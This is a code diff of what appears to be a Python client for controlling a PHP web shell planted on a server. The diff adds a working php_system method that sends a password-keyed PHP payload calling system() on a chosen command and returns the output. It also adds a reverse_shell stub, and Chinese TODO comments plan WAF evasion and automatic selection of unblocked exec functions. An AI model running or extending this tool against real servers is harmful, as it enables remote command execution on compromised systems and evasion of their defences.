@@ -1,11 +1,12 @@
 #!/usr/bin/env python
 # encoding: utf-8
 
-from random_string import random_string
-from http.build_url import build_url
+from core.utils.string_utils.random_string import random_string
+from core.utils.http.build_url import build_url
+from core.log import Log
+
 import requests
 import string
-import Log
 
 class WebShell():
     url = "http://127.0.0.1/c.php"
@@ -16,9 +17,9 @@ class WebShell():
         self.url = url
         self.method = method
         self.password = password
-        self.working = self.init(self.url, self.method, self.password)
+        self.init(self.url, self.method, self.password)
 
-    def check_working(url, method, auth):
+    def check_working(self, url, method, auth):
         Log.info("Checking whether the webshell is still work...")
         key = random_string(6, string.letters)
         value = random_string(32, string.letters)
@@ -40,66 +41,88 @@ class WebShell():
         content = response.content
         return value in content
 
-    def check_connection(url):
+    def check_connection(self, url):
         try:
             response = requests.head(url)
-            return (True, "The status code is %d" % (response.status_code))
+            code = response.status_code
+            if code != 200:
+                Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
+            else:
+                Log.success("The status code is %d" % (response.status_code))
+            return True
         except:
-            return (False,"Connection error!")
+            Log.error("Connection error!")
+            return False
 
     def init(self, url, method, password):
-        connection = self.check_connection(url)
-        if connection[0]:
-            Log.success(connection[1])
+        if self.check_connection(url):
             self.working = True
         else:
-            Log.error(connection[1])
             self.working = False
             return
+
         if self.check_working(url, method, password):
-            Log.success("It works!")
+            Log.success("It works well!")
             self.working = True
         else:
-            Log.error("It died!")
+            Log.error("It dead!")
             self.working = False
             return
 
 
-    def function_call(function_name, args):
+    def function_call(self, function_name, args):
         # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
         pass
 
-    def php_code_exec(code):
+    def php_code_exec(self, code):
         pass
 
-    def check_function_enable(function_name):
+    def check_function_enable(self, function_name):
         # TODO
         pass
 
-    def auto_exec(commad):
+    def auto_exec(self, command):
         # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
-        pass
+        return self.php_system(command)
 
-    def php_shell_exec(command):
+    def php_shell_exec(self, command):
         # TODO
         pass
 
-    def php_system(command):
+    def php_system(self, command):
+        # TODO
+        tick = random_string(3, string.letters)
+        token = random_string(32, string.letters)
+        if self.method == "POST":
+            data = {self.password:"echo '"+token+"';system($_POST["+tick+"]);", tick:command}
+            response = requests.post(self.url, data=data)
+        elif self.method == "GET":
+            params = {self.password:"echo '"+token+"';system($_GET["+tick+"]);", tick:command}
+            response = requests.get(self.url, params=params)
+        else:
+            return (False, "Unsupported method!")
+        content = response.text
+        if token in content:
+            return (True, content.replace(token, ""))
+        else:
+            return (False, content)
+
+    def php_popen(self, command):
         # TODO
         pass
 
-    def php_popen(command):
+    def php_proc_open(self, command):
         # TODO
         pass
 
-    def php_proc_open(command):
+    def php_exec(self, command):
         # TODO
         pass
 
-    def php_exec(command):
+    def php_passthru(self, command):
         # TODO
         pass
 
-    def php_passthru(command):
+    def reverse_shell(self, command):
         # TODO
         pass
